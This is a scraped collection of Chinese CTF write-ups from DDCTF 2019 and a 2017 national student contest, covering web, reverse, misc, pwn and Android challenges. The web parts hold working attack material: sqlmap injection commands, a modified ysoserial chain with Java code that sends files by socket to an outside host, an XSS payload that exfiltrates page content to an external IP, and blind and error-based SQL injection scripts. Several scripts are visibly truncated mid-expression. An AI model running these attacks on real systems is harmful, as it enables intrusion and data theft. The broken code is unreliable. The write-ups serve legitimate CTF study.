作者：evoA太脑洞了，太脑洞了，太脑洞了一直以为是sql，直到用xss的exp发现有bot请求在报名页面的备注里只对sql进行一点过滤，但是xss没有任何过滤，直接即可通过xss平台读页面源码读到一个接口http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id= 测了半天注入还是没东西，结果一堆人做出来后重新复测，注意到返回头GBK然后就是宽字节注入SQLmap加tamper都可以跑 #所有数据库名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --dbs --hex #数据库表名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex -D \"ctfdb\" --tables #字段名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex -D \"ctfdb\" -T \"ctf_fhmHRPL5\" --columns #flag python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex --sql-shell sql-shell> select ctf_value from ctfdb.ctf_fhmHRPL5; 常规操作，注库名，表名，字段名（TCL）做的时候想的太复杂了，但是我的sqlmap最后这里不能直接--dump，所以我执行了--sql-shell自定义sql命令最终拿的flagsqlmap宽字节注入自带的tamper是unmagicquotes这里因为过滤了单引号，所以我们需要用--hex参数将字符串转为0x开头的16进制数字避开引号 再来1杯Java 作者：5am3p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己太菜了，虽然本科专业为java开发狗。但我真的不太熟啊...一共分为三关吧。 首先是一个PadOracle攻击，伪造cookie。这个解密Cookie可以看到hint： PadOracle:iv/cbc。 第二关，读文件，看到后端代码后，才发现，这里贼坑。 第三关，反序列化。 首先第一关好说，其实在/api/account_info这个接口，就可以拿到返回的明文信息。然后通过Padding Oracle + cbc翻转来伪造cookie即可。在这里就不多说了。网上很多资料。 最后拿到cookie，直接浏览器写入cookie就OK。然后可以获取到一个下载文件的接口。 /api/fileDownload?fileName=1.txt 虽然说是一个任意文件读取的接口，但是贼坑、一顿操作猛如虎，最后只读出/etc/passwd... 搜到了很多字典。然后burp爆破一波，最后发现/proc/self/fd/15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）源码也不多，很容易，可以看到一个反序列化的接口。在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。 https://xz.aliyun.com/t/2479 直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。修改替换开启监听端口建议采用ceye的dnslog查看java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {{port}} URLDNS {{http://eval.com}}生成链接JRMPListener的payloadip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8119}} | base64此时将第10行生成的代码，直接打到远程即可。然后查看dnslog信息。发现存在，那就是ok了。接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！这个是hint中给的，所以我们需要找另一种方式，如：代码执行。查阅资料，发现ysoserial预留了这块的接口，修改即可。 https://blog.csdn.net/fnmsd/article/details/79534877 然后我们尝试去修改ysoserial/payloads/util/Gadgets.java中createTemplatesImpl方法如下： // createTemplatesImpl修改版，支持代码执行 public static T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory ) throws Exception { final T templates = tplClass.newInstance(); // use template gadget class ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); final CtClass clazz = pool.get(StubTransletPayload.class.getName()); // run command in static initializer // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections // String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + // command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + // \"\\\");\"; String cmd=\"\"; //如果以code:开头，认为是代码，否则认为是命令 if(!command.startsWith(\"code:\")){ cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + \"\\\");\"; } else{ System.err.println(\"Java Code Mode:\"+command.substring(5));//使用stderr输出，防止影响payload的输出 cmd = command.substring(5); } clazz.makeClassInitializer().insertAfter(cmd); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion) clazz.setName(\"ysoserial.Pwner\" + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); final byte[] classBytes = clazz.toBytecode(); // inject class bytes into instance Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][] { classBytes, ClassFiles.classAsBytes(Foo.class) }); // required to make TemplatesImpl happy Reflections.setFieldValue(templates, \"_name\", \"Pwnr\"); Reflections.setFieldValue(templates, \"_tfactory\", transFactory.newInstance()); return templates; } 此时，我们的payload已经可以支持代码执行了。在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。修改替换开启监听端口建议采用ceye的dnslog查看执行时合并为一行，为了好看，我换了下行 java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 CommonsBeanutils1 'code:System.out.printld(\"aaa\");' 生成链接JRMPListener的payloadip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64 此时将第10行生成的代码，直接打到远程即可。然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。 // 以下代码使用时，记得压缩到一行。 // 获取目录下内容 java.io.File file =new java.io.File(\"/\"); java.io.File[] fileLists = file.listFiles(); java.net.Socket s = new java.net.Socket(\"eval.com\",8768); for (int i = 0; i 然后操作如下：修改替换开启监听端口建议采用ceye的dnslog查看执行时合并为一行，为了好看，我换了下行 java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 CommonsBeanutils1 'code:{{javapayload}}' 生成链接JRMPListener的payload ip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64监听端口数据 nc -lnvp 2333 此时将第10行生成的代码，直接打到远程即可。 p.s. /flag是个文件夹 Reverse 作者：admin-琴里、impakho Cofused 这个文件下载下来是app的安装包然后再安装包里发现了一个叫xia0Crackme文件然后我们拖到IDA里面查找字符串交叉引用来到关键函数函数都标有注释（震惊！出题人果然是一个良好的大佬）程序验证了前六位是不是”DDCTF{“以是不是”}”然后把中间的字符串当做参数传到sub_1000011D0函数里如果这个函数的返回值等于1的话这个flag则正确 然后sub_1000011D0函数中首先是初始化了一个区域：v2Sub_100001f60是通过输入的字符串和内存数据对v2进行赋值操作前段是对v2进行赋值，最后将输入的字符串拷贝到qword_100003F58+48的位置 sub_100001F00函数对(*v2+24)进行赋值把一段数据赋给了他，然后是一个循环判断条件就是刚刚赋值的数据是不是等于“0xf3” 然后我们进入sub_100001E50这个函数是控制程序执行的vm的分支 跳转的分支就是刚刚给v2赋值的函数地址 sub_100001D70：相当于给一个寄存器赋值的操作然后sub_100001A60：异或操作ub_100001AA0：对操作后的字符和输入的字符进行比较sub_100001CB0：加操作sub_100001CF0：减操作sub_100001B10:设置判断是否正确标志位sub_100001D30：赋值操作 sub_100001C60：对内存中的数据进行操作两种运算:A～Z和a～z具体数据： 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x30, 0xf6,0xc1, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x31, 0xf6,0xb6, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x32, 0xf6,0xab, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x33, 0xf6,0xa0, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x34, 0xf6,0x95, 0xf0,0x10,0x57,0x0,0x0,0x0, 0xf8, 0xf2,0x35, 0xf6,0x8a, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x36, 0xf6,0x7f, 0xf0,0x10,0x73,0x0,0x0,0x0, 0xf8, 0xf2,0x37, 0xf6,0x74, 0xf0,0x10,0x45,0x0,0x0,0x0, 0xf8, 0xf2,0x38, 0xf6,0x69, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x39, 0xf6,0x5e, 0xf0,0x10,0x72,0x0,0x0,0x0, 0xf8, 0xf2,0x3a, 0xf6,0x53, 0xf0,0x10,0x52,0x0,0x0,0x0, 0xf8, 0xf2,0x3b, 0xf6,0x48, 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x3c, 0xf6,0x3d, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x3d, 0xf6,0x32, 0xf0,0x10,0x44,0x0,0x0,0x0, 0xf8, 0xf2,0x3e, 0xf6,0x27, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x3f, 0xf6,0x1c, 0xf0,0x10,0x79,0x0,0x0,0x0, 0xf8, 0xf2,0x40, 0xf6,0x11, 0xf0,0x10,0x65,0x0,0x0,0x0, 0xf8, 0xf2,0x41, 0xf6,0x6, 0xf7,0x1,0x0,0x0,0x0,0xf3 最后可以得到flag：hello******TheFlag DDCTF{hello******TheFlag}(PS:题目作者真是一名优秀的程序员) Reverse 2 作者：impakho查壳，显示 ASPack ，用工具脱壳。上 IDA 分析。sub_11D11F0 函数判断输入的字符串是否在 0-9,A-F 的范围内，并且长度是否为偶数。sub_11D1240 函数是一个 hex2bin 的转换。sub_11D1000 函数是一个 base64 编码的过程，编码结果再异或 0x76。编码表为 byte_11D3020。 贴上解密脚本： enc='reverse+' dec1='' table='373435323330313E3F3C3D3A3B383926272425222320212E2F2C171415121310111E1F1C1D1A1B181906070405020300010E0F0C46474445424340414E4F5D59'.decode('hex') dec2=[] flag='' for i in enc: dec1+=chr(ord(i)^0x76) for i in dec1: dec2.append(table.index(i)) for i in range(2): a=dec2[4*i+0] b=dec2[4*i+1] c=dec2[4*i+2] d=dec2[4*i+3] flag+=chr((a>4)) flag+=chr(((b>2)) flag+=chr(((cFlag: DDCTF{AD******C7BE} MISC 作者：admin-琴里、impakho wireshark 我们得到流量包，分析流量包并未发现敏感信息。 。。然后，就试着导出文件 得到：并未有任何发现。。 然后，就试着再次分析流浪包。 在追踪流时发现多个图片。又发现了一个解密网站。。。把图片手动导出。。。 （16进制工具） 得到：发现了钥匙。。。然后就是获得key发现图片钥匙头朝下。。。猜测可能隐藏高度：把高度改为07 50，得到keykey:57pmYyWt然后在线解密就得到flag了。 MulTzor 流量分析。关键点在 HTTP 里。这里上传了两张图片，可以导出来得到 upload.png 和 interesting.png。upload.png 在 MacOS 和 Kali 下都无法预览，想到应该是图片尺寸被修改，根据 PNG 头部的 CRC 爆破图片尺寸，图片尺寸修复脚本如下。 import os import binascii import struct misc = open(\"upload.png\",\"rb\").read() for i in range(1024): data = misc[12:20] + struct.pack('>i',i) + misc[24:29] crc32 = binascii.crc32(data) & 0xffffffff if crc32 == struct.unpack('>i',misc[29:33])[0]: print i data = misc[0:20] + struct.pack('>i',i) + misc[24:] open('upload_repaire.png','wb').write(data) 看到有个 Key: xS8niJM7 ，结合流量包里访问过的 在线图片隐写网址 ，可以在线解密出 interesting.png 里隐写的内容。Flag: DDCTF{NbuiBUlR5l*****fpEmueZd64OlRJ1D2} 北京地铁 提示：AES ECB密钥为小写字母 提示2：密钥不足位用\\0补全 提示3：不要光记得隐写不看图片本身啊... 根据题目提示，查隐写，在 LSB 里找到一串 base64 编码的字符串，应该是 AES 的密文。进一步根据 Color Threshold 提示，用 PhotoShop 调整图片的阀值，找到 北京地铁线路图 上某一站点的颜色不一样，这个站点的 小写拼音字母 为加密密钥。 from Crypto.Cipher import AES from base64 import * cipher=b64decode('7SsQWmZ524i/yVWoMeAIJA==') key='weigongcun'.ljust(16,'\\x00') mode=AES.MODE_ECB c=AES.new(key, mode) print c.decrypt(cipher) Flag: DDCTF{Q****@B0} 联盟决策大会 以下为使用到的7个十六进制常数： p = C45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627 E3ED40FBDE968251984513ACC2B627B4A483A6533 组织1成员1 = 729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB17 77357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E 组织1成员2 = 478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C 24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6 组织1成员4 = BFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB 5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D 组织2成员3 = 9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A 0A494BE36CEF44ADE376317E7A0C70633E3091A61 组织2成员4 = 79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393F C7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8 组织2成员5 = 2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472 444A3CE2368E5A6EBF96603B3CD10EAE858150510 根据题目提示，在维基百科上可以找到 Shamir算法 的解密脚本。使用 组织1成员1 & 组织1成员2 & 组织1成员4 & p，可以解密得到 组织1密文。使用 组织2成员3 & 组织2成员4 & 组织2成员5 & p，可以解密得到 组织2密文。刚开始想直接将两者进行 xor 处理，应该就能得到明文，其实这样行不通。后来发现将两者拿去进行解密，就可以得到明文了。附上解密脚本： from __future__ import division from __future__ import print_function import random import functools _PRIME = 2**127 - 1 _RINT = functools.partial(random.SystemRandom().randint, 0) def _eval_at(poly, x, prime): accum = 0 for coeff in reversed(poly): accum *= x accum += coeff accum %= prime return accum def make_random_shares(minimum, shares, prime=_PRIME): if minimum > shares: raise ValueError(\"pool secret would be irrecoverable\") poly = [_RINT(prime) for i in range(minimum)] points = [(i, _eval_at(poly, i, prime)) for i in range(1, shares + 1)] return poly[0], points def _extended_gcd(a, b): x = 0 last_x = 1 y = 1 last_y = 0 while b != 0: quot = a // b a, b = b, a%b x, last_x = last_x - quot * x, x y, last_y = last_y - quot * y, y return last_x, last_y def _divmod(num, den, p): inv, _ = _extended_gcd(den, p) return num * inv def _lagrange_interpolate(x, x_s, y_s, p): k = len(x_s) assert k == len(set(x_s)), \"points must be distinct\" def PI(vals): accum = 1 for v in vals: accum *= v return accum nums = [] dens = [] for i in range(k): others = list(x_s) cur = others.pop(i) nums.append(PI(x - o for o in others)) dens.append(PI(cur - o for o in others)) den = PI(dens) num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p) for i in range(k)]) return (_divmod(num, den, p) + p) % p def recover_secret(shares, prime=_PRIME): if len(shares) Flag: DDCTF{vF22holF5hl5*****FZ5kZ1DBdWOGObk} PWN 作者：admin-琴里 Strike 首先，我们读一下整个程序我们可以看到这里buf可以输入0x40个字节查看安全检查，没有canary后面通过调试这里输入可以泄露下面输入password可以看到这里signed 变成了unsigned这里的话 就是一个整形溢出漏洞然后，我们就可以进行栈溢出攻击我们通过第一步泄露libc地址在进行第二部攻击的时候发现这里最后的指令是会困住你的lea esp,[ecx-4]改变了栈地址retn的时候要注意我尝试按照一般的做法直接覆盖是行不通的就只能泄露栈地址然后计算偏移算出libc_base附件给了libc，可以确定onegadget然后通过第二部的栈溢出构造返回为one_gadget就直接shel然后我们就能拿到flag Android 感谢作者：impakho Breaking LEM 提示：The format of the flag is DDCTF{ddctf-android-lorenz-ZFXXXXXX}, where XXXXXX represents a 6-char string comprised of A-Z and 0-9. MAX Attempts Limit is 5 看题目应该是 Lorenz Cipher，上维基百科恶补一番。反编译 APK，找到关键函数在 libhello-libs.so 文件里的： Java_com_didictf_guesskey2019lorenz_MainActivity_stringFromJNI(int a1); 结合动态调试，分析出输入要以 ddctf-android-lorenz- 开头，里面会去除这个开头，然后判断剩下的字符串是否在 A-Z,1-6 范围内，然后拿去做 Lorenz Encrypt，最后加密结果做 5轮sha256 计算，比较结果是否与设定值相同。LEM 初始化时会设置 Pinsettings，也就是轮子的初始值，然后每次转轮生成固定的密钥，有点像 srand 和 rand 产生伪随机数的过程。然后用户输入还经过 TelePrinter 的 Baudot 编码转换。生成的密钥与用户输入进行 xor 处理。完成一次加密需要进行 10轮 这个步骤。根据题目提示，需要交给 LEM 做加密的字符串为 ZFXXXXXX（X 代表的字符在 A-Z,1-6 范围内）。为了省事，在此处下断点读 v4，读 8*10=80 次，把需要用到的密钥读出来。已知明文前面两字节为 ZF，需要爆破后面6字节。写出爆破脚本如下： from hashlib import sha256 target='4b27bd0beaa967e3625ff6f8b8ecf76c5beaa3bda284ba91967a3a5e387b0fa7' table='ABCDEFGHIJKLMNOPQRSTUVWXYZ123456' key=[0x9,0x17,0x16,0x3,0x12,0xB,0x1B,0x0,0x4,0x10,0x19,0x5,0x17,0x1D,0x17,0x18,0x18,0x19,0xE,0x3,0x8,0x8,0x18,0xD,0x1E,0x9,0x19,0x1E,0x13,0x0,0x1E,0x1F,0x5,0x11,0x1A,0xD,0x17,0xF,0x1C,0x7,0x1B,0xA,0x8,0x9,0x7,0x1F,0x17,0xA,0xF,0x1F,0x4,0xD,0x18,0xE,0xB,0xB,0x12,0x4,0x3,0xD,0xD,0x4,0x5,0x1D,0xE,0x11,0x8,0x5,0x15,0x1C,0x7,0x1E,0x14,0x9,0x1F,0x2,0xD,0xE,0xA,0x19] tele=[3,25,14,9,1,13,26,20,6,11,15,18,28,12,24,22,23,10,5,16,7,30,19,29,21,17,0,4,8,2,27] flag='ZF' enc='' for i in range(2): tmp=tele[table.index(flag[i])] for j in range(10): tmp^=key[j*8+i] enc+=table[tele.index(tmp)] print enc i=0 succ=0 for a in table: for b in table: for c in table: for d in table: for e in table: for f in table: if i%100000==0: print float(i)*100/1073741824 tmp=enc+a+b+c+d+e+f res=tmp for k in range(5): res=sha256(res).hexdigest() i+=1 if res==target: print tmp enc=tmp succ=1 break if succ==1: break if succ==1: break if succ==1: break if succ==1: break if succ==1: break flag='' for i in range(8): tmp=tele[table.index(enc[i])] for j in range(10): tmp^=key[j*8+i] flag+=table[tele.index(tmp)] print 'DDCTF{ddctf-android-lorenz-%s}' % flag 跑大概一个小时左右，就能跑到 Flag 了。 Flag: DDCTF{ddctf-android-******-ZFPQETDB} Have Fun 这题真令人头疼。变量名全部经过 Unicode混淆，字符串全部经过 动态解密混淆，关键代码还插了 垃圾指令 导致生成伪代码失败。 尝试动态调试，直接闪退，logcat 显示 loadlibrary 时抛出 has invalid shdr offset/size 错误。上网查了一下，发现 Android >= 7 时开启了诸多对 .so 文件的检测。而这道题的 .so 头部被修改过，所以过不了这个检测。先对 libhwFGfOp0EzktJb.so 进行分析。此处会判断输入长度是否为14字节。然后与 off_2910 进行比较。 off_2910 = @n|ixihPIppqws 再分析一下 smali 代码。发现它会调用到一个外部 dex 文件：assets/Y2xhc3Nlc19kZC5kZXg=。 这里会对用户输入进行 Encode，然后再交由 .so 进行比较。写解密脚本，发现提交答案始终不正确。在这里卡了一段时间，后来重新审计 smali 代码，发现自己还是太年轻了，没玩懂出题人的套路。里面有段代码会动态修改外部 dex 文件，往里面插入一些代码，重新计算头部的校验值，并且生成一个新的 dex 文件，释放到 /sdcard/ 里的一个隐藏文件夹里。新文件名为 dnsmanYUn12M.dex，这个才是真正被调用到的 dex 文件。没理解错的话，整个流程用术语好像是叫作 热修复？那么如何得到新的 dex 文件呢。搞了很久，终于找到一条行得通的办法。由于 .so 被修改了头，直接运行 APK 会闪退，所以注释掉 smali 里 loadlibrary 这一行，重新打包 APK，这样就能不会闪退了。然后点击 Check 的按钮，让它生成新的 dex 文件，并且由于没有 loadlibrary 无法调用外部函数，触发闪退。这样就能从隐藏文件夹里提取出新的 dnsmanYUn12M.vdex 和 dnsmanYUn12M.odex文件。然后手工转成 dnsmanYUn12M.dex 文件，进一步分析。这才是真正的 dex 文件。套路真的深～写解密脚本，一个很简单的解密流程。 enc='@n|ixihPIppqws' flag='' for i in range(len(enc)): flag+=chr(ord(enc[i])^(i+8)) print flag 终于得到 Flag。 Flag: DDCTF{Hg******_Yabbcf} 评论区 请文明评论，禁止广告 "},"articals/2017national.html":{"url":"articals/2017national.html","title":"2017全国信安赛","keywords":"","body":"2017全国大学生信息安全竞赛 题目类型： 类型 年份 难度 官方赛事题 2017 中 题目下载： 暂无 网上公开WP: https://www.anquanke.com/post/id/86431 https://p0sec.net/index.php/archives/107/ https://blog.csdn.net/csu_vc/article/details/78011716 https://blog.csdn.net/aptx4869_li/article/details/80589250 网上公开WP: 暂无 本站备份WP： 作者：FlappyPig web 一.PHP execise 类型：WEB 分值：150分直接就能执行代码，先执行phpinfo(),发现禁用了如下函数 assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm, pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled, pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch, pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait, pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents, file,readfile,opendir,readdir,closedir,rewinddir, 然后通过foreach (glob(\"./*\") as $filename) { echo $filename.\"\"; } glob()函数经常用于disable_function()的绕过，该函数的作用是返回匹配指定模式的文件名或目录。 该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。 列出当前目录，然后再用highlight_file()函数读取flag文件内容即可 此处还可用shou_source函数 web 250 首先通过svn泄露获取到源码，然后观察发现主要部分在login.php这里 11){ echo(\"alert('name too long')\"); }else{ $sql = \"select count(*) from t_info where username = '$name' or nickname = '$name'\"; echo $sql; $result = mysql_query($sql); $row = mysql_fetch_array($result); if ($row[0]){ $_SESSION['hat'] = 'black'; echo 'good job'; }else{ $_SESSION['hat'] = 'green'; } header(\"Location: index.php\"); } } 由index.php中代码: 当$_SESSION['hat'] = 'black';时，在index.php下面就能获取到flag， 但是我们注册时候插入的表是t_user，而这里登陆查询的表是t_info,所以思路就只有想办法在login这里注入，结合login.php分析可知，在login.php中，第5行，但会结果不为空，即可。 因此构造poc 最后构造的payload如下： name=or%0a1=1%0a#'&submit=check 成功获取到flag为flag{good_job_white_hat} 8.Classical 类型：web 分值：300分 题目类似WCTF某原题。 加密代码生成了超递增的sk后，使用sk * mask % N作为pk进行使用。flag被用于选取pk求和得到sum。 是典型的Knapsack problem，使用Shamir Attack进行攻击。在github上有很多此类加密方案的攻击办法： https://github.com/taniayu/merklehellman-lll-attack https://github.com/kutio/liblll https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy 攻击方法为首先构造矩阵，通过lllattack求得新的矩阵，选取最短的向量即可。 c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569 pubkey=[（自己去复制吧）] from Crypto.Util.number import long_to_bytes as l2b def create_matrix(pub, c): n = len(pub) i = matrix.identity(n) * 2 last_col = [-1] * n first_row = [] for p in pub: first_row.append(int(long(p))) first_row.append(-c) m = matrix(ZZ, 1, n+1, first_row) bottom = i.augment(matrix(ZZ, n, 1, last_col)) m = m.stack(bottom) return m def is_target_value(V): for v in V: if v!=-1 and v!=1: return False return True def find_shortest_vector(matrix): for col in matrix.columns(): if col[0] == 0 and is_target_value(col[1:]): return col else: continue pub = pubkey c = c m = create_matrix(pub, c) lllm = m.transpose().LLL().transpose() shortest_vector = find_shortest_vector(lllm) print shortest_vector x = \"\" for v in shortest_vector[1:]: if v == 1: x += \"1\" elif v == -1: x += \"0\" print x print hex(int(x,2))[2:-1].decode(\"hex\") #flag{M3k13_he11M4N_1ik3s_1Att1ce} 10.flag bending machine 类型：WEB 分值：300分 进去是一个注册及登陆，经过一番fuzz，认为最有可能是二次注入 例如我注册一个bendawang' or 1=1#和注册一个bendawang' or 1=0#，猜想在查询余额时的语句为 select xxx from xxx where username=bendawang' or 1=1# select xxx from xxx where username=bendawang' or 1=0# 所以很容易知道，如果是第一种情况，后面的or 1=1恒真，也就是查询的结果是整个表的结果，而第二个则是用户名为bendawang的结果，也就是说，猜想查询多个结果时取第一个的话，如果我购买了东西，也就是第一种情况显示的余额是不变的，而第二种情况是会变的。就可以根据这个点来进行二分盲注。 另外需要注意的是，题目过滤了一些关键字，select ,from ,on等，不过可以双写绕过，其中on是最坑的，这是最开始测试union是否被过滤发现的。都可以通过双写就能绕过了。 其它也就没有什么过滤了。 最后爆破出来的表名fff1ag，列名thisi5f14g 爆破flag的脚本如下： import requests import string import random import time import re #fff1ag #thisi5f14g url='http://106.75.107.53:8888/' chars=string.printable[:62]+\"!@#$%^&*()_+-={}\" header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive' } def register(data): result = requests.post(url+\"register.php\",data=data,headers=header) if \"Register success\" in result.content: return True else: return False def check(data): data=data.replace('on','') #print data r=requests.session() content=r.post(url+\"login.php\",data=data,headers=header).content #print content if \"wrong\" in content: raw_input(\"error!!!!!!!!!!!!!!!!!!!!!!\"); balance=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance1:\"+str(balance) r.get(url+'buy.php?id=1') content=r.get(url+'user.php').content balance2=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance2:\"+str(balance2) if balance-2333==balance2: return True else: return False ans=\"\" for i in xrange(1,100): for j in chars: username=str(time.time())+\"' or ord(substr((selonect thisi5f14g froonm fff1ag),%d,1))=%s#\"%(i,ord(j)) #print username password='123' data='user='+username+'&pass='+password if register(data)==True: print i,j if check(data)==True: ans+=j print ans break 截图如下： 14.Guestbook 类型：WEB 分值：400分 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 然后是沙盒： //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; 发现沙盒和之前0ctf一样，csp也允许了unsafe-eval的执行 然后开始测试，经过测试发现link标签啊，location都被过滤替换成hacker。 但是location很容易绕过例如window['locat'+'ion'].href 所以思路和0ctf一样，用一个iframe从其他路径下“借用”一个XMLHttpRequest，来发送请求，大概初始payload如下： window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://106.75.103.149:8888/index.php \", false); xhr.send(); a=xhr.responseText; window['locat'+'ion'].href='http://104.160.43.154:8000/xss/?content='+escape(a); 能够成功获得服务器的返回，但是没有cookie，源码里面也没有flag，通过测试document.referrer，发现这个地址： 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 最后修正payload如下： 16.方舟计划 类型：WEB 分值：400分 首先扫描发现在注册时手机那一栏存在报错注入 username='ad121212122min'&phone=' or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or'&password='admin'=''#&repassword='admin'=''# 可以获得账户密码 登录进去发现是ffpm读取任意文件 然后读取etc/passwd 被过滤了 稍微绕过一下就能读了 得到用户名s0m3b0dy 在其home目录下读取到flag文件 二、REVERSE 2.填数游戏 类型：REVERSE 分值：200分 逆向一看就是个数独游戏，主要就是把原来的9*9找出来 里面有一块初始化数独，那个地方看出来是 他的数独题目就如下一样，然后找个网站解一下， 然后输入时候把存在的项变成0就行 5.apk crack 类型：REVERSE 分值：300分 本题的做法比较取巧，首先使用jeb2打开apk文件，查看验证的关键流程 可以看到，程序在取得了用户输入的字符串后，会调用wick.show方法，这个方法会调用jni中的对应函数，该jni函数会开启反调试并给静态变量A、B赋值success和failed。随后会进入simple.check方法开启验证。 这个验证函数非常长，笔者也没看懂。Simple类中有两个字节数组，一个用于存储输入，把它命名为input；另一个数组初始为空，把它命名为empty。 